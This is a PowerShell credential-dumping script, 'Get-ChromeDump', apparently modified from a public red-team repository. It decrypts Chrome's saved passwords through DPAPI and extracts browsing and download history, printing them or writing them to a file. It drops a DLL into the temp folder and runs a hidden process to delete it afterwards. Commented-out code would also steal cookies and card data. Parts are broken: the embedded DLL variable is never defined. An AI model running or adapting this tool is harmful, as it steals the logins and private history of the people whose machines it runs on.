Function Get-ChromeDump
{

<#
.SYNOPSIS
Modified version of https://github.com/xorrior/RandomPS-Scripts/blob/master/Get-ChromeDump.ps1

This function returns any passwords, history or downloads history stored in the chrome sqlite databases.

.DESCRIPTION
This function uses the System.Data.SQLite assembly to parse the different sqlite db files used by chrome to save passwords and browsing history. The System.Data.SQLite assembly
cannot be loaded from memory. This is a limitation for assemblies that contain any unmanaged code and/or compiled without the /clr:safe option.

.PARAMETER OutFile
Switch to dump all results out to a file.

.PARAMETER DumpCreds
Switch to dump login credentials.

.PARAMETER DumpHistory
Switch to dump history.

.PARAMETER DumpDownloads
Switch to dump downloads history.

.EXAMPLE

Get-ChromeDump -DumpCreds -DumpHistory -DumpDownloads -OutFile "$env:HOMEPATH\chromepwds.txt"

Dump All chrome passwords, history and downloads history to the specified file

.LINK
https://github.com/H3LL0WORLD

#>

[CmdletBinding()]

	Param
	(
		[Parameter(Mandatory = $False)]
		[Switch] $DumpCreds,
		[Parameter(Mandatory = $False)]
		[Switch] $DumpHistory,
		[Parameter(Mandatory = $False)]
		[Switch] $DumpDownloads,
		[Parameter(Mandatory = $False)]
		[String]$OutFile
	)
	BEGIN
	{
		if (!($DumpCreds -or $DumpHistory -or $DumpDownloads))
		{
		Write-Warning "[!] Nothing to do"
		return
		}

		#Check to see if the script is being run as SYSTEM. Not going to work.
		if (([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem)
		{
		  Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
		  [Bool] $NoPasswords = $True
		}
		
		#Add the required assembly for decryption
		Add-Type -Assembly System.Security

		if([IntPtr]::Size -eq 8)
		{
			#64 bit version
		}
		else
		{
			#32 bit version
		
		}
		# Unable to load this assembly from memory. The assembly was most likely not compiled using /clr:safe and contains unmanaged code. Loading assemblies of this type from memory will not work. Therefore we have to load it from disk.
		# DLL for sqlite queries and parsing
		# http://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki
		Write-Verbose "[+] System.Data.SQLite.dll will be written to disk"
		
	   
		$Content = [Convert]::FromBase64String($Assembly) 
		
		
		
		$AssemblyPath = "$env:TMP\System.Data.SQLite.dll" 
		
		if (Test-Path $AssemblyPath)
		{
			try
			{
				Add-Type -Path $AssemblyPath -ErrorAction SilentlyContinue
			}
			catch
			{
				Write-Warning "[!] Unable to load SQLite assembly"
				Write-Warning "[!] Please remove SQLite assembly from here: $assemblyPath"
				return
			}
		}
		else
		{
			try 
			{
				[IO.File]::WriteAllBytes($AssemblyPath,$Content)
				
				Write-Verbose "[+] Assembly for SQLite written to $assemblyPath" 
			}
			catch 
			{
			  Write-Warning "[!] Unable to load SQLite assembly"
			  return
			}
			finally
			{
				Add-Type -Path $AssemblyPath
			}
		}

		#Check if Chrome is running. The data files are locked while Chrome is running 

		if (Get-Process | Where-Object {$_.Name -like "*chrome*"})
		{
		  Write-Verbose "[!] Chrome is running"
		  Write-Verbose "[>] Databases will be copied to a temp folder and removed later"
		  $ChromeRunning = $true;
		  #break
		}

		# Grab the path to Chrome user data
		$OS = [Environment]::OSVersion.Version
		if ($OS.Major -ge 6)
		{
		  $ChromeUserDataPath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
		}
		else
		{
		  $ChromeUserDataPath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
		}
		
		if (!(Test-path $ChromeUserDataPath))
		{
		  Throw "Chrome user data directory does not exist"
		}
		else
		{
			#DB for CC and other info
			<#if (Test-Path -Path "$ChromeUserDataPath\Web Data")
			{
				if ($ChromeRunning)
				{
					Copy-Item -Path "$ChromeUserDataPath\Web Data" -Destination "$env:TMP\Web Data" -Force
					$WebDataDB = "$env:TMP\Web Data"
				}
				else
				{
					$WebDataDB = "$ChromeUserDataPath\Web Data"
					Write-Verbose "[+] Web Data DB Temporarily  copied to: $WebDataDB"
				}
			}#>
			#DB for passwords 
			if (Test-Path -Path "$ChromeUserDataPath\Login Data")
			{
				if ($ChromeRunning)
				{
					Copy-Item -Path "$ChromeUserDataPath\Login Data" -Destination "$env:TMP\Login Data" -Force
					$LoginDataDB = "$env:TMP\Login Data"
					Write-Verbose "[+] Login Data DB Temporarily  copied to: $LoginDataDB"
				}
				else
				{
					$LoginDataDB = "$ChromeUserDataPath\Login Data"
				}
			}
			  #DB for history
			if (Test-Path -Path "$ChromeUserDataPath\History")
			{
				if ($ChromeRunning)
				{
					Copy-Item -Path "$ChromeUserDataPath\History" -Destination "$env:TMP\History" -Force
					$HistoryDB = "$env:TMP\History"
					Write-Verbose "[+] History DB Temporarily  copied to: $HistoryDB"
				}
				else
				{
					$HistoryDB = "$ChromeUserDataPath\History"
				}
			}
			# DB for cookies
			<#if (Test-Path -Path "$ChromeUserDataPath\Cookies")
			{
				if ($ChromeRunning)
				{
					Copy-Item -Path "$ChromeUserDataPath\Cookies" -Destination "$env:TMP\Cookies" -Force
					$CookiesDB = "$env:TMP\Cookies"
					Write-Verbose "[+] Cookies DB Temporarily  copied to: $CookiesDB"
				}
				else
				{
					$CookiesDB = "$ChromeUserDataPath\Cookies"
				}
			}#>
		}
	}
    
    PROCESS
    {
		if ($DumpCreds -and !($NoPasswords))
		{
			$ConnectionString = "Data Source=$loginDatadb; Version=3;"
			$Connection = New-Object Data.SQLite.SQLiteConnection($ConnectionString)
			$OpenConnection = $Connection.OpenAndReturn()

			Write-Verbose "[+] Opened DB file $loginDatadb"

			$Query = "SELECT * FROM logins;"

			$Dataset = New-Object Data.DataSet
			$DataAdapter = New-Object Data.SQLite.SQLiteDataAdapter($Query,$OpenConnection)

			[Void]$DataAdapter.fill($dataset)

			Write-Verbose "Parsing results of query $query"
		  
			$Logins = @()
			$Dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
				# Decrypt password
				$EncryptedBytes = $_.password_value
				$DecryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($EncryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
				$Plaintext = [Text.Encoding]::Ascii.GetString($DecryptedBytes)
				
				$Logins += New-Object PSObject -Property @{
					Url = $_.action_url
					Username = $_.username_value
					Password = $plaintext
				}
			}
		}
		
		# Cookies
		<#$ConnectionString = "Data Source=$CookiesDB;New=True;UseUTF16Encoding=True";
		$Connection = [Data.SQLite.SQLiteConnection]($ConnectionString)
		$OpenConnection = $Connection.OpenAndReturn()
		
		$Query = "SELECT cookies.creation_utc, cookies.host_key, cookies.name, cookies.encrypted_value, cookies.path, cookies.expires_utc, cookies.secure, cookies.httponly, cookies.last_access_utc, cookies.has_expires, cookies.persistent, cookies.priority FROM cookies;"
		
		$DataSet = New-Object Data.DataSet
		$DataAdapter = New-Object Data.SQLite.SQLiteDataAdapter($Query,$OpenConnection)
		[Void]$DataAdapter.Fill($DataSet)
		
		$Cookies = @()
		$DataSet.Tables | Select-Object -ExpandProperty Rows | Foreach-Object {
			try
			{
				$DecryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($_.encrypted_value, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
			}
			catch
			{
				Write-Warning "[!] Unable to decrypt Cookies"
				$Cookies = $null
			}
			break
			$Value = [Text.Encoding]::Ascii.GetString($DecryptedBytes)
			
			$Cookie = New-Object PSObject -Property @{
				Name = $_.name
				Value = $Value
				Path = $_.path
				"Host Key" = $_.host_key
				Priority = $_.priority
				Secure = [Bool] $_.secure
				"Http Only" = [Bool] $_.httponly
				"Has Expires" = [Bool] $_.has_expires
				Persistent = [Bool] $_.persistent
				"Expire Time" = (New-Object DateTime).AddSeconds(($_.expires_utc/1000000)-11644473600)
				"Creation Time" = (New-Object DateTime).AddSeconds(($_.creation_utc/1000000)-11644473600)
				"Last Access Time" = (New-Object DateTime).AddSeconds(($_.last_access_utc/1000000)-11644473600)
			}
			$Cookies += $Cookie
		}#>
		
		if ($DumpHistory)
		{
			#Parse the History DB
			$ConnectionString = "Data Source=$historydb;New=True;UseUTF16Encoding=True;"
			$Connection = New-Object Data.SQLite.SQLiteConnection($ConnectionString)
			$Open = $Connection.OpenAndReturn()

			Write-Verbose "[+] Opened DB file $historydb"

			$Query = 'SELECT visits.visit_time, urls.title, urls.url FROM urls, visits WHERE urls.id = visits.url;'
			
			$DataSet = New-Object Data.DataSet
			$DataAdapter = New-Object Data.SQLite.SQLiteDataAdapter($Query,$Open)
			
			[Void]$DataAdapter.Fill($DataSet)

			$History = @()
			$DataSet.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
			$History += New-Object PSObject -Property @{
				"Visit Time" = ([DateTime]"1601,1,1").AddSeconds($_.visit_time/1000000)
				Title = $_.title 
				URL = $_.url
			  }
			}
		}
		
		if ($DumpDownloads)
		{
			$ConnectionString = "Data Source=$historydb;New=True;UseUTF16Encoding=True;"		
			$Connection = New-Object Data.SQLite.SQLiteConnection($ConnectionString)
			$Open = $Connection.OpenAndReturn()

			Write-Verbose "[+] Opened DB file $historydb"
			$ChromePath = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
			if (!(Test-Path $ChromePath))
			{
				"$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
			}
			$ChromeVersion = [Diagnostics.FileVersionInfo]::GetVersionInfo($ChromePath).FileMajorPart;
			# Set the SQL query depending of the Chrome Version
			if ($ChromeVersion -lt 26)
			{
				$Query = 'SELECT downloads.start_time,downloads.full_path,downloads.url,downloads.received_bytes,downloads.total_bytes FROM downloads;'
			}
			else
			{
				$Query = 'SELECT downloads.start_time, downloads.target_path, downloads_url_chains.url, downloads.received_bytes, downloads.total_bytes FROM downloads, downloads_url_chains WHERE downloads.id = downloads_url_chains.id;'
			}
			
			$DataSet = New-Object Data.DataSet
			$DataAdapter = New-Object Data.SQLite.SQLiteDataAdapter($Query,$Open)

			[Void]$DataAdapter.Fill($DataSet)

			$Downloads = @()
			$DataSet.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
				$Downloads += New-Object PSObject -Property @{
					"Start Time" = ([DateTime]"1601,1,1").AddSeconds($_.start_time/1000000)
					"Target Path" = if ($ChromeVersion -lt 26) {$_.full_path} else {$_.target_path}
					URL = $_.url
					"Received Bytes" = $_.received_bytes
					"Total Bytes" = $_.total_bytes
				}
			}
		}
	}
    
    END
    {
		if ($OutFile)
		{
			if ($Logins)
			{
				"[*]LOGINS`n" | Out-File $OutFile 
				($logins | Format-List Url,Username,Password)| Out-File $OutFile -Append
			}
			
			if ($History)
			{
				"[*]HISTORY`n" | Out-File $OutFile -Append
				($History | Sort-Object -Descending -Property "Visit Time" | Format-List "Visit Time",Title,Url) | Out-File $OutFile -Append  
			}
			if ($Downloads)
			{
				"[*]DOWNLOADS`n" | Out-File $OutFile -Append
				($Downloads | Sort-Object -Descending -Property "Start Time" | Format-List "Start Time","Target Path",Url,"Received Bytes","Total Bytes") | Out-File $OutFile -Append
			}
		}
		else
		{
			if ($Logins)
			{
				"[*]CHROME PASSWORDS`n"
				$logins | Format-List Url,Username,Password | Out-String
			}
			if ($History)
			{
				"[*]CHROME HISTORY`n"
				$History | Sort-Object -Descending -Property "Visit Time" | Format-List "Visit Time",Title,Url | Out-String
			}
			if ($Downloads)
			{
				"[*]CHROME DOWNLOADS`n"
				$Downloads | Sort-Object -Descending -Property "Start Time" | Format-List "Start Time","Target Path",Url,"Received Bytes","Total Bytes" | Out-String
			}
		}
		
		if ($ChromeRunning)
		{
			if ($WebDataDB)
			{
				Remove-Item -Path $WebDataDB -Force -ErrorAction SilentlyContinue
				Write-Verbose "[-] Temporary Web Data DB removed"
			}
			if ($LoginDataDB)
			{
				Remove-Item -Path $LoginDataDB -Force -ErrorAction SilentlyContinue
				Write-Verbose "[-] Temporary Login Data DB removed"
			}
			if ($HistoryDB)
			{
				Remove-Item -Path $HistoryDB -Force -ErrorAction SilentlyContinue
				Write-Verbose "[-] Temporary History DB removed"
			}
		}

		# Unable to remove the dll until the current process end
		# Start a new hidden process which wait until this process end to delete the dll
		if (!($Global:GCD_BP))
		{
			Start-Process powershell "While (Get-Process -PID $PID -ErrorAction SilentlyContinue){Start-Sleep -Seconds 1}Remove-Item -Force -Path '$AssemblyPath'" -WindowStyle Hidden
			$Global:GCD_BP = $true
		}
	}	
}